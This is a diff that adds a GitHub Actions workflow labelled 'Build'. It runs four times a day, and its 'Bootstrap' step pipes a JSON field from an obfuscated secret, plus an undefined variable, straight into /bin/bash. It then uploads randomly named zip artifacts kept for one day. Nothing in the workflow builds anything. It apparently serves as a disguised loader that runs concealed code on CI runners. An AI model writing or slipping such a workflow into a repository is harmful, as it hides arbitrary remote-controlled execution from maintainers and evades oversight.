@@ -1,0 +1,32 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '3 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          zxadi1: ${{ secrets.zxadi1 }}
+        run: |
+          printf '%s' "$zxadi1" | jq -r .brd523 | /bin/bash
+          echo $g3829 | jq -r .lwr63 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: RWs7YU1i
+          path: "*.zip"
+          retention-days: 1
